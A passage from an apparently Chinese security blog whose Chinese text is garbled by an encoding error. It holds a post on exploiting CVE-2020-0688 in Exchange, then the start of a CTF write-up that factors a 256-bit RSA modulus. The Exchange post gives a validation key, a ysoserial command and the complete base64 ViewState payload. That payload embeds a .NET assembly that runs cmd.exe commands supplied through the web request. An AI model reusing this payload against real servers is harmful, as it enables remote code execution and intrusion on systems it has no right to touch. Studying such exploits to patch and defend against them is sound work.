<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">validationKey&#x3D;&quot;47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9&quot;</span><br><span class="line"></span><br><span class="line">validationalg&#x3D;&quot;SHA1&quot;</span><br><span class="line"></span><br><span class="line">generator&#x3D;CA0B0334</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆè¦è·å–åˆ°è¿™ä¸‰ä¸ªå€¼</p>
<p>ç„¶åä½¿ç”¨ysoserial.exeç”Ÿæˆviewstate</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c <span class="string">"ExploitClass.cs;./System.dll;./System.Web.dll"</span> --generator=<span class="string">"CA0B0334"</span> --validationalg=<span class="string">"SHA1"</span> --validationkey=<span class="string">"47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;wEy7EoAAQAAAP&#x2F;&#x2F;&#x2F;&#x2F;8BAAAAAAAAAAwCAAAATlN5c3RlbS5EYXRhLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQUBAAAAE1N5c3RlbS5EYXRhLkRhdGFTZXQKAAAAFkRhdGFTZXQuUmVtb3RpbmdGb3JtYXQTRGF0YVNldC5EYXRhU2V0TmFtZRFEYXRhU2V0Lk5hbWVzcGFjZQ5EYXRhU2V0LlByZWZpeBVEYXRhU2V0LkNhc2VTZW5zaXRpdmUSRGF0YVNldC5Mb2NhbGVMQ0lEGkRhdGFTZXQuRW5mb3JjZUNvbnN0cmFpbnRzGkRhdGFTZXQuRXh0ZW5kZWRQcm9wZXJ0aWVzFERhdGFTZXQuVGFibGVzLkNvdW50EERhdGFTZXQuVGFibGVzXzAEAQEBAAAAAgAHH1N5c3RlbS5EYXRhLlNlcmlhbGl6YXRpb25Gb3JtYXQCAAAAAQgBCAICAAAABf3&#x2F;&#x2F;&#x2F;8fU3lzdGVtLkRhdGEuU2VyaWFsaXphdGlvbkZvcm1hdAEAAAAHdmFsdWVfXwAIAgAAAAEAAAAGBAAAAAAJBAAAAAkEAAAAAAkEAAAACgEAAAAJBQAAAA8FAAAAfCMAAAIAAQAAAP&#x2F;&#x2F;&#x2F;&#x2F;8BAAAAAAAAAAQBAAAAf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLk9iamVjdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0DAAAABl9pdGVtcwVfc2l6ZQhfdmVyc2lvbgUAAAgICQIAAAAHAAAABwAAABACAAAACAAAAAkDAAAACQQAAAAJBQAAAAkGAAAACQcAAAAJCAAAAAkJAAAACgwKAAAAYVN5c3RlbS5Xb3JrZmxvdy5Db21wb25lbnRNb2RlbCwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAwAAAGpTeXN0ZW0uV29ya2Zsb3cuQ29tcG9uZW50TW9kZWwuU2VyaWFsaXphdGlvbi5BY3Rpdml0eVN1cnJvZ2F0ZVNlbGVjdG9yK09iamVjdFN1cnJvZ2F0ZStPYmplY3RTZXJpYWxpemVkUmVmAgAAAAR0eXBlC21lbWJlckRhdGFzAwUfU3lzdGVtLlVuaXR5U2VyaWFsaXphdGlvbkhvbGRlcgoAAAAJCwAAAAkMAAAAAQQAAAADAAAACQ0AAAAJDgAAAAEFAAAAAwAAAAkPAAAACRAAAAABBgAAAAMAAAAJEQAAAAkSAAAAAQcAAAADAAAACRMAAAAJFAAAAAEIAAAAAwAAAAkVAAAACRYAAAAECQAAABxTeXN0ZW0uQ29sbGVjdGlvbnMuSGFzaHRhYmxlBwAAAApMb2FkRmFjdG9yB1ZlcnNpb24IQ29tcGFyZXIQSGFzaENvZGVQcm92aWRlcghIYXNoU2l6ZQRLZXlzBlZhbHVlcwAAAwMABQULCBxTeXN0ZW0uQ29sbGVjdGlvbnMuSUNvbXBhcmVyJFN5c3RlbS5Db2xsZWN0aW9ucy5JSGFzaENvZGVQcm92aWRlcgjsUTg&#x2F;AgAAAAoKAwAAAAkXAAAACRgAAAAECwAAAB9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAREYXRhCVVuaXR5VHlwZQxBc3NlbWJseU5hbWUBAAEIBhkAAAD4AVN5c3RlbS5MaW5xLkVudW1lcmFibGUrV2hlcmVTZWxlY3RMaXN0SXRlcmF0b3JgMltbU3lzdGVtLkJ5dGVbXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHksIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAYaAAAATlN5c3RlbS5Db3JlLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4ORAMAAAABwAAAAkbAAAACgkcAAAACR0AAAAICAAAAAAKCAgBAAAAAQ0AAAALAAAABh4AAAD4AVN5c3RlbS5MaW5xLkVudW1lcmFibGUrPFNlbGVjdE1hbnlJdGVyYXRvcj5kX18xN2AyW1tTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAkaAAAAEA4AAAAJAAAACAj+&#x2F;&#x2F;&#x2F;&#x2F;CggIAQAAAAoJAwAAAAoJIQAAAA0CAQ8AAAALAAAABiIAAADvAVN5c3RlbS5MaW5xLkVudW1lcmFibGUrV2hlcmVTZWxlY3RFbnVtZXJhYmxlSXRlcmF0b3JgMltbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAkaAAAAEBAAAAAHAAAACQQAAAAKCSUAAAAKCAgAAAAACggIAQAAAAERAAAACwAAAAYmAAAAKVN5c3RlbS5XZWIuVUkuV2ViQ29udHJvbHMuUGFnZWREYXRhU291cmNlBAAAAAYnAAAATVN5c3RlbS5XZWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iMDNmNWY3ZjExZDUwYTNhEBIAAAAHAAAACQUAAAAICAAAAAAICAoAAAAIAQAIAQAIAQAICAAAAAABEwAAAAsAAAAGKQAAAClTeXN0ZW0uQ29tcG9uZW50TW9kZWwuRGVzaWduLkRlc2lnbmVyVmVyYgQAAAAGKgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5EBQAAAAFAAAADQIJKwAAAAgIAwAAAAkIAAAAARUAAAALAAAABi0AAAA0U3lzdGVtLlJ1bnRpbWUuUmVtb3RpbmcuQ2hhbm5lbHMuQWdncmVnYXRlRGljdGlvbmFyeQQAAAAGLgAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkQFgAAAAEAAAAJBgAAABAXAAAAAgAAAAkHAAAACQcAAAAQGAAAAAIAAAAGMQAAAAAJMQAAAAQbAAAAf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLkJ5dGVbXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0DAAAABl9pdGVtcwVfc2l6ZQhfdmVyc2lvbgMAAA9TeXN0ZW0uQnl0ZVtdW10ICAkyAAAAAQAAAAEAAAAEHAAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAgAAAAhEZWxlZ2F0ZQdtZXRob2QwAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCTMAAAAJNAAAAAQdAAAAigFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDErRW51bWVyYXRvcltbU3lzdGVtLkJ5dGVbXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0EAAAABGxpc3QFaW5kZXgHdmVyc2lvbgdjdXJyZW50AwAAB39TeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5CeXRlW10sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCAgCCgAAAAAAAAAACgEhAAAAHAAAAAk1AAAACTYAAAABJQAAABwAAAAJNwAAAAk4AAAAASsAAAADAAAACTkAAAAJOgAAAAcyAAAAAQEAAAAEAAAABwIJOwAAAAoKCgQzAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BjwAAADVAVN5c3RlbS5GdW5jYDJbW1N5c3RlbS5CeXRlW10sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkuAAAACgkuAAAABj4AAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkGPwAAAARMb2FkCgQ0AAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQk&#x2F;AAAACS4AAAAJPgAAAAZCAAAAJ1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQZDAAAALlN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5IExvYWQoU3lzdGVtLkJ5dGVbXSkIAAAACgE1AAAAMwAAAAZEAAAAzAJTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmFibGVgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkuAAAACgkuAAAACT4AAAAGRwAAAAhHZXRUeXBlcwoBNgAAADQAAAAJRwAAAAkuAAAACT4AAAAGSgAAABhTeXN0ZW0uVHlwZVtdIEdldFR5cGVzKCkGSwAAABhTeXN0ZW0uVHlwZVtdIEdldFR5cGVzKCkIAAAACgE3AAAAMwAAAAZMAAAAxgFTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLk9iamVjdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JLgAAAAoJLgAAAAZOAAAAEFN5c3RlbS5BY3RpdmF0b3IGTwAAAA5DcmVhdGVJbnN0YW5jZQoBOAAAADQAAAAJTwAAAAkuAAAACU4AAAAGUgAAAClTeXN0ZW0uT2JqZWN0IENyZWF0ZUluc3RhbmNlKFN5c3RlbS5UeXBlKQZTAAAAKVN5c3RlbS5PYmplY3QgQ3JlYXRlSW5zdGFuY2UoU3lzdGVtLlR5cGUpCAAAAAoBOQAAAAsAAAAGVAAAACZTeXN0ZW0uQ29tcG9uZW50TW9kZWwuRGVzaWduLkNvbW1hbmRJRAQAAAAJKgAAABA6AAAAAgAAAAlWAAAACAgAIAAADzsAAAAAEAAAAk1akAADAAAABAAAAP&#x2F;&#x2F;AAC4AAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAOH7oOALQJzSG4AUzNIVRoaXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2RlLg0NCiQAAAAAAAAAUEUAAEwBAwDS43ZeAAAAAAAAAADgAAIhCwELAAAIAAAABgAAAAAAAN4mAAAAIAAAAEAAAAAAABAAIAAAAAIAAAQAAAAAAAAABAAAAAAAAAAAgAAAAAIAAAAAAAADAECFAAAQAAAQAAAAABAAABAAAAAAAAAQAAAAAAAAAAAAAACMJgAATwAAAABAAACoAgAAAAAAAAAAAAAAAAAAAAAAAABgAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAgAAAAAAAAAAAAAAAggAABIAAAAAAAAAAAAAAAudGV4dAAAAOQGAAAAIAAAAAgAAAACAAAAAAAAAAAAAAAAAAAgAABgLnJzcmMAAACoAgAAAEAAAAAEAAAACgAAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAADAAAAABgAAAAAgAAAA4AAAAAAAAAAAAAAAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAAwCYAAAAAAABIAAAAAgAFADAhAABcBQAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbMAMAwwAAAAEAABECKAMAAAooBAAACgoGbwUAAApvBgAACgZvBwAACm8IAAAKcwkAAAoLB28KAAAKcgEAAHBvCwAACgZvDAAACm8NAAAKchEAAHBvDgAACgwHbwoAAApyGQAAcAgoDwAACm8QAAAKB28KAAAKF28RAAAKB28KAAAKF28SAAAKB28KAAAKFm8TAAAKB28UAAAKJgdvFQAACm8WAAAKDQZvBwAACglvFwAACt4DJt4ABm8HAAAKbxgAAAoGbwcAAApvGQAACioAARAAAAAAIgCHqQADDgAAAUJTSkIBAAEAAAAAAAwAAAB2NC4wLjMwMzE5AAAAAAUAbAAAALwBAAAjfgAAKAIAAHACAAAjU3RyaW5ncwAAAACYBAAAJAAAACNVUwC8BAAAEAAAACNHVUlEAAAAzAQAAJAAAAAjQmxvYgAAAAAAAAACAAABRxQCAAkAAAAA+iUzABYAAAEAAAAOAAAAAgAAAAEAAAAZAAAAAgAAAAEAAAABAAAAAwAAAAAACgABAAAAAAAGACkAIgAGAFYANgAGAHYANgAKAKgAnQAKAMAAnQAKAOgAnQAOABsBCAEOACMBCAEKAE8BnQAOAIYBZwEGAKwBIgAGACECFwIGAEECFwIGAGYCIgAAAAAAAQAAAAAAAQABAAAAEAAXAAAABQABAAEAUCAAAAAAhhgwAAoAAQARADAADgAZADAACgAJADAACgAhALQAHAAhANIAIQApAN0ACgAhAPUAJgAxAAIBCgA5ADAACgA5ADQBKwBBAEIBMAAhAFsBNQBJAJoBOgBRAKMBPwBZALMBRABBALoBMABBAMgBSgBBAOMBSgBBAP0BSgA5ABECTwA5AC4CUwBpAEwCWAAxAFYCMAAxAFwCCgAxAGICCgAuAAsAZQAuABMAbgBcAASAAAAAAAAAAAAAAAAAAAAAAJQAAAAEAAAAAAAAAAAAAAABABkAAAAAAAQAAAAAAAAAAAAAABMAnQAAAAAABAAAAAAAAAAAAAAAAQAiAAAAAAAAAAA8TW9kdWxlPgBkZ3BrNXJsNS5kbGwARQBtc2NvcmxpYgBTeXN0ZW0AT2JqZWN0AC5jdG9yAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBkZ3BrNXJsNQBTeXN0ZW0uV2ViAEh0dHBDb250ZXh0AGdldF9DdXJyZW50AEh0dHBTZXJ2ZXJVdGlsaXR5AGdldF9TZXJ2ZXIAQ2xlYXJFcnJvcgBIdHRwUmVzcG9uc2UAZ2V0X1Jlc3BvbnNlAENsZWFyAFN5c3RlbS5EaWFnbm9zdGljcwBQcm9jZXNzAFByb2Nlc3NTdGFydEluZm8AZ2V0X1N0YXJ0SW5mbwBzZXRfRmlsZU5hbWUASHR0cFJlcXVlc3QAZ2V0X1JlcXVlc3QAU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkAE5hbWVWYWx1ZUNvbGxlY3Rpb24AZ2V0X0Zvcm0AZ2V0X0l0ZW0AU3RyaW5nAENvbmNhdABzZXRfQXJndW1lbnRzAHNldF9SZWRpcmVjdFN0YW5kYXJkT3V0cHV0AHNldF9SZWRpcmVjdFN0YW5kYXJkRXJyb3IAc2V0X1VzZVNoZWxsRXhlY3V0ZQBTdGFydABTeXN0ZW0uSU8AU3RyZWFtUmVhZGVyAGdldF9TdGFuZGFyZE91dHB1dABUZXh0UmVhZGVyAFJlYWRUb0VuZABXcml0ZQBGbHVzaABFbmQARXhjZXB0aW9uAAAPYwBtAGQALgBlAHgAZQAAB2MAbQBkAAAHLwBjACAAAAAAAFPrEJ4OwFZKu3aYOkFG4&#x2F;oACLd6XFYZNOCJAyAAAQQgAQEICLA&#x2F;X38R1Qo6BAAAEhEEIAASFQQgABIZBCAAEiEEIAEBDgQgABIlBCAAEikEIAEODgUAAg4ODgQgAQECAyAAAgQgABIxAyAADggHBBIREh0ODggBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEAAAC0JgAAAAAAAAAAAADOJgAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwCYAAAAAAAAAAAAAAABfQ29yRGxsTWFpbgBtc2NvcmVlLmRsbAAAAAAA&#x2F;yUAIAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAQAAADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAATAIAAAAAAAAAAAAATAI0AAAAVgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7&#x2F;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&#x2F;OpgYOnebs0UrRhI&#x3D;</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆviewsateçš„exp</p>
<p><img src="/.com//2.png" alt="image-20200328160555486"></p>
<p><img src="/.com//3.png" alt="image-20200328160743008"></p>
<h1 id="åè¯"><a href="#åè¯" class="headerlink" title="åè¯"></a>åè¯</h1><p><img src="/.com//4.png" alt="image-20200328160838814"></p>
<p>é‡åˆ°è¿™ä¸ªé—®é¢˜</p>
<p>æœ‰å¾…è§£å†³</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/03/08/CVE-2020-0688/" data-id="ck8sqr5hj0005kou57znbanr6" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-crypto-exercise" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/03/04/crypto-exercise/" class="article-date">
  <time datetime="2020-03-04T09:15:35.000Z" itemprop="datePublished">2020-03-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/03/04/crypto-exercise/">crypto-exercise</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="word-in-the-first"><a href="#word-in-the-first" class="headerlink" title="word in the first"></a>word in the first</h1><p>è®°å½•æˆ‘é‡åˆ°çš„ä¸€äº›é¢˜</p>
<h1 id="crypto-exercise"><a href="#crypto-exercise" class="headerlink" title="crypto-exercise"></a>crypto-exercise</h1><h2 id="iæ˜¥ç§‹ç¬¬äºŒå±Šæ˜¥ç§‹æ¬¢ä¹èµ›RSA256"><a href="#iæ˜¥ç§‹ç¬¬äºŒå±Šæ˜¥ç§‹æ¬¢ä¹èµ›RSA256" class="headerlink" title="iæ˜¥ç§‹ç¬¬äºŒå±Šæ˜¥ç§‹æ¬¢ä¹èµ›RSA256"></a>iæ˜¥ç§‹ç¬¬äºŒå±Šæ˜¥ç§‹æ¬¢ä¹èµ›RSA256</h2><p>é¢˜ç›®æ˜¯ç»™äº†å››ä¸ªæ–‡ä»¶</p>
<p><img src="/.com//1.png" alt="image-20200229004841511"></p>
<p>encrypted.message1</p>
<p>encrypted.message2</p>
<p>encrypted.message3</p>
<p>è¿˜æœ‰ public.key</p>
<p>è¿™æ—¶å€™å¯ä»¥æƒ³åˆ°openssl</p>
<p><img src="/.com//2.png" alt="image-20200229005206103"></p>
<p>å…¶ä¸­</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Exponent = <span class="number">65537</span></span><br><span class="line">N = <span class="number">0xD99E952296A6D960DFC2504ABA545B9442D60A7B9E930AFF451C78EC55D555EB</span></span><br><span class="line">    (<span class="number">98432079271513130981267919056149161631892822707167177858831841699521774310891</span>)</span><br></pre></td></tr></table></figure>



<p>åˆ†è§£ä¸€ä¸‹<a href="http://www.factordb.com/index.php" target="_blank" rel="noopener">factordb.com</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p&#x3D;302825536744096741518546212761194311477</span><br><span class="line"></span><br><span class="line">q&#x3D;325045504186436346209877301320131277983</span><br></pre></td></tr></table></figure>



